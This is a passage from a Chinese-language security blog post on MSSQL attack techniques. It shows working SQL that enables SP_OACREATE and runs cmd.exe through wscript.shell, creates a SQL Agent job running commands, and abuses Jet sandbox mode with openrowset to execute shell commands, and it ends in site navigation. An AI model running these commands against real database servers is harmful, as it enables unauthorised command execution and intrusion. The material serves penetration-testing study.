+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/kSRvQl4FpeBZJoO.png" alt="image-20220206142054709"></p>
+<h3 id="8-2-启动SP-OACREATE"><a href="#8-2-启动SP-OACREATE" class="headerlink" title="8.2 启动SP_OACREATE"></a>8.2 启动SP_OACREATE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;   </span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;   </span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/3N4VwcXp5PY2aJy.png" alt="image-20220206142231328"></p>
+<h3 id="8-3-利用"><a href="#8-3-利用" class="headerlink" title="8.3 利用"></a>8.3 利用</h3><p>  建议先使用<code>DNSlog</code>检测漏洞是否存在</p>
+<p>  可以在服务器上开启<code>smb</code>服务，让执行结果写入服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\temp\1.txt&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/06/FPoamelQ4sMI6q5.png" alt="image-20220206142340925"></p>
+<p><img src="img/image-20220206165226469.png" alt="image-20220206165226469"></p>
+<p><strong>参考链接</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7534#toc-9">https://xz.aliyun.com/t/7534#toc-9</a></p>
+<h2 id="9-Agent-Job"><a href="#9-Agent-Job" class="headerlink" title="9.Agent Job"></a>9.Agent Job</h2><p>  我本地环境启动<code>sql server 代理</code>失败，只能简单记录一下命令。后续再补上细节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">USE msdb; </span><br><span class="line">EXEC dbo.sp_add_job @job_name = N&#x27;test_powershell_job1&#x27;; </span><br><span class="line">EXEC sp_add_jobstep @job_name = N&#x27;test_powershell_job1&#x27;, @step_name = N&#x27;test_powershell_name1&#x27;, @subsystem = N&#x27;PowerShell&#x27;, @command = N&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#x27;test_powershell_job1&#x27;; </span><br><span class="line">EXEC dbo.sp_start_job N&#x27;test_powershell_job1&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>参考链接</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7534#toc-20">https://xz.aliyun.com/t/7534#toc-20</a></p>
+<h2 id="10-沙盒执行命令"><a href="#10-沙盒执行命令" class="headerlink" title="10.沙盒执行命令"></a>10.沙盒执行命令</h2><p>  本地没有相关漏洞的环境只能简单记录命令，后续再补细节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:\windows\system32\ias\dnary.mdb&#x27;,&#x27;select shell(&quot;whoami&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>参考链接</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7534#toc-20">https://xz.aliyun.com/t/7534#toc-20</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mssql-%E6%9D%82%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">mssql 杂记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AE%89%E8%A3%85mssql%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.</span> <span class="toc-text">1.安装mssql服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-mssql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">2. mssql常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-mssql-link%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">3.mssql link服务利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.2 利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-xp-cmdshell"><span class="toc-number">1.4.</span> <span class="toc-text">4.xp_cmdshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E4%BB%80%E4%B9%88%E6%98%AFxp-cmdshell"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 什么是xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%BC%80%E5%90%AFxp-cmdshell"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 开启xp_cmdshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-NTLM"><span class="toc-number">1.5.</span> <span class="toc-text">5.NTLM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E7%8E%AF%E5%A2%83"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">6.提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1%E5%8F%AF%E4%BF%A1%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.1.</span> <span class="toc-text">6.1可信提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">6.1.1 环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-2-%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">6.1.2 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-3-%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">6.1.3 原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E8%AF%AD%E8%A8%80%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.2.</span> <span class="toc-text">6.2 语言提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-1-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">6.2.1 环境安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-2-python-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">6.2.2 python 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-3-R-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">6.2.3 R 提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-mssql-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.3.</span> <span class="toc-text">6.3 mssql 模拟登录提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">6.3.1 环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3-2-%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.3.2.</span> <span class="toc-text">6.3.2 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3-3-%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.3.3.</span> <span class="toc-text">6.3.3 原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-CLR"><span class="toc-number">1.7.</span> <span class="toc-text">7.CLR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E4%BB%80%E4%B9%88%E6%98%AFCLR"><span class="toc-number">1.7.1.</span> <span class="toc-text">7.1 什么是CLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="toc-number">1.7.2.</span> <span class="toc-text">7.2 环境安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E5%88%9B%E5%BB%BADLL"><span class="toc-number">1.7.3.</span> <span class="toc-text">7.3 创建DLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-%E5%88%A9%E7%94%A8"><span class="toc-number">1.7.4.</span> <span class="toc-text">7.4 利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-SP-OACREATE"><span class="toc-number">1.8.</span> <span class="toc-text">8.SP_OACREATE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-%E6%A3%80%E6%B5%8BSP-OACREATE%E7%8A%B6%E6%80%81"><span class="toc-number">1.8.1.</span> <span class="toc-text">8.1 检测SP_OACREATE状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-%E5%90%AF%E5%8A%A8SP-OACREATE"><span class="toc-number">1.8.2.</span> <span class="toc-text">8.2 启动SP_OACREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-%E5%88%A9%E7%94%A8"><span class="toc-number">1.8.3.</span> <span class="toc-text">8.3 利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-Agent-Job"><span class="toc-number">1.9.</span> <span class="toc-text">9.Agent Job</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.10.</span> <span class="toc-text">10.沙盒执行命令</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&text=mssql 杂记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&title=mssql 杂记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&is_video=false&description=mssql 杂记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mssql 杂记&body=Check out this article: http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&title=mssql 杂记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&title=mssql 杂记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&title=mssql 杂记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&title=mssql 杂记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&name=mssql 杂记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/02/06/mssql-%E6%9D%82%E8%AE%B0/&t=mssql 杂记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
